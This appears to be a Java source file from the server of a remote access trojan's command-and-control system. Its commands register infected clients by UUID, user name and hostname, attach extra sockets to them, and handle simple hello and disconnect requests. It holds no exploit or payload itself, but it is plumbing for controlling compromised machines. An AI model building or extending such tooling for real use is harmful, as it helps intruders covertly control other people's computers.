package ovh.wpkg.lskg.server.command.commands;

import jakarta.inject.Singleton;
import lombok.extern.slf4j.Slf4j;
import ovh.wpkg.lskg.server.command.Command;
import ovh.wpkg.lskg.server.command.CommandContext;
import ovh.wpkg.lskg.server.dto.RatClient;
import ovh.wpkg.lskg.server.services.RatClientPoller;
import ovh.wpkg.lskg.server.services.ConnectedRatService;
import ovh.wpkg.lskg.server.services.WtpClientService;
import ovh.wpkg.lskg.server.types.out.ActionOutPayload;
import ovh.wpkg.lskg.services.rat.RatInfoService;
import ovh.wpkg.lskg.services.users.UserService;
import java.util.ArrayList;
import java.util.UUID;

@Singleton
@Slf4j
@SuppressWarnings("unused")
public class DefaultCommands {

    private final WtpClientService wtpClientService;
    private final ConnectedRatService connectedRatService;
    private final UserService userService;
    private final RatClientPoller ratClientPoller;
    private final RatInfoService ratInfoService;

    public DefaultCommands(WtpClientService wtpClientService, ConnectedRatService connectedRatService,
                           UserService userService, RatClientPoller ratClientPoller, RatInfoService ratInfoService) {
        this.wtpClientService = wtpClientService;
        this.connectedRatService = connectedRatService;
        this.userService = userService;
        this.ratClientPoller = ratClientPoller;
        this.ratInfoService = ratInfoService;
    }

    @Command(name = "hello")
    public ActionOutPayload hello(CommandContext context) {
        return context.response(0, "Hello World!");
    }

    @Command(name = "disconnect")
    public ActionOutPayload disconnect(CommandContext context) {
        context.getWtpClient().getChannel().disconnect();
        return context.response(0, "Disconnected!");
    }

    @Command(name = "core-init")
    public ActionOutPayload coreInit(CommandContext context) {
        try {
            if (context.checkParams("uuid", "user", "hostname"))
                return context.response(1, "Missing or empty parameter");

            UUID uuid = UUID.fromString(context.param("uuid"));
            String user = context.param("user");
            String hostname = context.param("hostname");

            ratInfoService.registerRat(userService.findUserById(1L), uuid, hostname, user);

            connectedRatService.addClient(new RatClient(context.getWtpClient(), uuid, user, hostname, new ArrayList<>()));

            return context.response(0,"Registered client " + user + " " + hostname + " has been added!");
        } catch (Exception e) {
            return context.response(3, "An unexpected error occurred: " + e.getMessage());
        }
    }

    @Command(name = "new-socket")
    public ActionOutPayload newSocket(CommandContext context) {
        if (context.checkParams("uuid")) {
            return context.response(1, "Missing or empty parameter");
        }

        try {
            UUID uuid = UUID.fromString(context.param("uuid"));
            RatClient rat = connectedRatService.getByUUID(uuid);

            if (rat == null)
                return context.response(1, "No entity found for UUID: " + uuid);

            rat.getSockets().add(context.getWtpClient());

            // Notify that new client was registered
            ratClientPoller.notifyRegistered(context.getWtpClient());

            return context.response(0, "Socket successfully added!");
        } catch (IllegalArgumentException e) {
            return context.response(1, "Invalid UUID format: " + context.param("uuid"));
        }
    }
}